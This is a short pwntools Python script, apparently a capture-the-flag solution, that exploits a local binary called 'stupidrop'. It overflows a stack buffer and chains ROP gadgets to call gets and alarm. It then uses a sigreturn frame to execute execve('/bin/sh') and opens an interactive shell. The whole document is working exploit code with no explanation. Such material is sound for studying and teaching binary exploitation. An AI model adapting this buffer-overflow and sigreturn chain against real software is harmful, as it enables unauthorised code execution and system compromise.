from pwn import * 

target = process("./stupidrop", "b * main + 47")

elf = ELF("stupidrop")



context.arch = "amd64"

syscall = p64(0x000000000040063e)
pop_rdi = p64(0x00000000004006a3)
bss =  p64(0x601070)
gets = p64(elf.symbols['gets'])
alarm = p64(elf.symbols["alarm"])
print(hex(elf.symbols["alarm"]))
xor_al = 0x0000000000400287

payload = b"A" * 0x38


payload += pop_rdi
payload += bss
payload += gets
payload += pop_rdi
payload += p64(0xf)
payload += alarm
payload += pop_rdi
payload += p64(0x0)
payload += alarm
payload += syscall


frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = 0x601070
frame.rsi = 0x0
frame.rdx = 0x0
frame.rip = 0x40063e

payload += bytes(frame)
target.sendline(payload)
print(hex(elf.symbols['gets']))
target.sendline(b"/bin/sh\x00")

target.interactive()
